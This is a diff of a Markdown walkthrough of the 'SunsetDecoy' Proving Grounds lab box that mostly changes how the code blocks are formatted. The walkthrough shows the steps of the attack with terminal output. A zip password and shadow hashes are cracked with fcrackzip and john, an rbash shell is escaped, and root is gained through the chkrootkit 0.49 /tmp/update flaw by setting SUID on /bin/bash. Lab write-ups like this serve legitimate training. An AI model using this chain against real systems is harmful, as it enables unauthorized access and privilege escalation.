@@ -72,7 +72,8 @@ Grabando a: “save.zip”
 save.zip                            100%[===================================================================>]   3,05K  --.-KB/s    en 0,001s  
 
 2021-10-15 16:03:22 (2,20 MB/s) - “save.zip” guardado [3123/3123]
-```shell
+```
+
 
 ```shell
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# binwalk -e save.zip 
@@ -88,6 +89,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 3101          0xC1D           End of Zip archive
 ```
 
+
 ```shell
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' save.zip 
 
@@ -95,6 +97,7 @@ root@kali:/OSCPv3/offsec_pg/SunsetDecoy# fcrackzip -u -D -p '/usr/share/wordlist
 PASSWORD FOUND!!!!: pw == manuel
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# 
 ```
+
 
 ```shell
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# unzip save.zip 
@@ -107,6 +110,7 @@ Archive:  save.zip
   inflating: etc/hosts               
  extracting: etc/hostname            
 ```
+
 
 ```shell
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# cat hostname 
@@ -152,6 +156,7 @@ root	ALL=(ALL:ALL) ALL
 #includedir /etc/sudoers.d
 ```
 
+
 ```shell
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# unshadow passwd shadow > hashes.txt
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
@@ -163,7 +168,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 server           (296640a3b825115a47b68fc44501c828)
 ```
 
-
+```shell
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# ssh 296640a3b825115a47b68fc44501c828@192.168.131.85
 296640a3b825115a47b68fc44501c8@192.168.131.85's password: 
 Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
@@ -181,9 +186,9 @@ permitted by applicable law.
 -rbash: less: command not found
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ftp
 -rbash: ftp: command not found
+```
 
-
-
+```shell
 root@kali:/OSCPv3/offsec_pg/SunsetDecoy# ssh 296640a3b825115a47b68fc44501c828@192.168.131.85 -t "bash --noprofile"
 296640a3b825115a47b68fc44501c8@192.168.131.85's password: 
 bash: dircolors: command not found
@@ -191,40 +196,24 @@ bash: dircolors: command not found
 bash: whoami: command not found
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ less
 bash: less: command not found
-
-
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls
 honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  local.txt  ls  mkdir  user.txt
-
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/cat local.txt 
 f539d346fd63f9aeda807814485edca1
+```
 
-
-296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/sudo -l
-sudo: unable to resolve host 60832e9f188106ec5bcc4eb7709ce592: Name or service not known
-[sudo] password for 296640a3b825115a47b68fc44501c828: 
-Sorry, user 296640a3b825115a47b68fc44501c828 may not run sudo on 60832e9f188106ec5bcc4eb7709ce592.
-
+```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
 PATH:/home/296640a3b825115a47b68fc44501c828/
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH="/bin:$PATH"
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
 296640a3b825115a47b68fc44501c828
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ 
+```
 
-
-
-296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ more honeypot.decoy
-
-******** honeypot.decoy: Not a text file ********
-
-296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls
-honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  local.txt  ls  mkdir  user.txt
+```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ file honeypot.decoy
 honeypot.decoy: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c2d7512e6f628f98adb080abd295115cc9e0c2f, not stripped
-
-
-
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
 --------------------------------------------------
 
@@ -239,10 +228,10 @@ Welcome to the Honey Pot administration manager (HPAM). Please select an option.
 8 Check all services status.
 
 Option selected:5
+```
 
 
-
-
+```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ more process.sh 
 #!/bin/bash
 
@@ -258,7 +247,9 @@ while true; do
 	old_process=$new_process
 done
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod +x process.sh 
+```
 
+```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy
 --------------------------------------------------
 
@@ -276,8 +267,8 @@ Option selected:5
 
 The AV Scan will be launched in a minute or less.
 --------------------------------------------------
-
-
+```
+```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./process.sh 
 < ./honeypot.decoy
 < sh -c /usr/sbin/service apache2 status
@@ -295,8 +286,10 @@ The AV Scan will be launched in a minute or less.
 > [kworker/u2:2-flush-8:0]
 < [kworker/u2:2-flush-8:0]
 > [kworker/u2:2-events_unbound]
+```
+https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/
 
-
+```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo 'chmod u+s /bin/bash' > /tmp/update
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod 777 /tmp/update
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
@@ -318,10 +311,8 @@ The AV Scan will be launched in a minute or less.
 --------------------------------------------------
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
-296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ 
-
-
-
+```
+```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./process.sh
 > /bin/sh /root/chkrootkit-0.49/chkrootkit
 < /usr/sbin/CRON -f
@@ -341,13 +332,9 @@ The AV Scan will be launched in a minute or less.
 > [kworker/u2:2-flush-8:0]
 < [kworker/u2:2-flush-8:0]
 > [kworker/u2:2-events_unbound]
+```
 
-
-296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/bash -p
-bash-5.0# whoami
-root
-bash-5.0# 
-
+```shell 
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/bash -p
 bash-5.0# whoami
 root
@@ -361,7 +348,7 @@ bash-5.0# cat root.txt
 Your flag is in another file...
 bash-5.0# cat proof.txt
 9c44f7969ac22a551f9565d15930577c
-bash-5.0# 
+``` 
 
 
 
